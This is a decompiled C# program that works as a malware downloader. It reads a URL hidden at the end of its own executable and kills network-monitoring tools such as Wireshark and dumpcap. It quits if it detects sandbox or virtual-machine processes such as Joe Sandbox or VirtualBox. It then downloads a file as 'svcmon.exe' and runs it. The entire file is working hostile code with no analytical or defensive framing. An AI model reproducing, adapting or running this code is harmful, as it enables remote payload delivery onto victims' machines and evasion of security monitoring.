using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

internal class Class0
{
	[STAThread]
	private static void Main(string[] args)
	{
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		string @string = aSCIIEncoding.GetString(bytes);
		@string = @string.Substring(@string.Length - 100);
		string[] array = @string.Split(new char[1] { '_' });
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("wireshark");
			Process[] processesByName2 = Process.GetProcessesByName("EtherD");
			Process[] processesByName3 = Process.GetProcessesByName("joeboxserver");
			Process[] processesByName4 = Process.GetProcessesByName("joeboxcontrol");
			Process[] processesByName5 = Process.GetProcessesByName("VBoxService");
			Process[] processesByName6 = Process.GetProcessesByName("dumpcap");
			Process.GetProcessesByName("sniff_hit");
			Process.GetProcessesByName("sysAnalyzer");
			if (processesByName.Length != 1)
			{
				if (processesByName2.Length == 1)
				{
					Process[] processesByName7 = Process.GetProcessesByName("EtherD");
					foreach (Process process in processesByName7)
					{
						process.Kill();
					}
					continue;
				}
				if (processesByName3.Length == 1)
				{
					Application.Exit();
					return;
				}
				if (processesByName4.Length == 1)
				{
					Application.Exit();
					return;
				}
				if (processesByName5.Length == 1)
				{
					Application.Exit();
					return;
				}
				if (processesByName6.Length != 1)
				{
					break;
				}
				Process[] processesByName8 = Process.GetProcessesByName("dumpcap");
				foreach (Process process2 in processesByName8)
				{
					process2.Kill();
				}
			}
			else
			{
				Process[] processesByName9 = Process.GetProcessesByName("wireshark");
				foreach (Process process3 in processesByName9)
				{
					process3.Kill();
				}
			}
		}
		WebClient webClient = new WebClient();
		webClient.DownloadFile(array[0], "svcmon.exe");
		Process.Start("svcmon.exe");
		Application.Exit();
	}
}
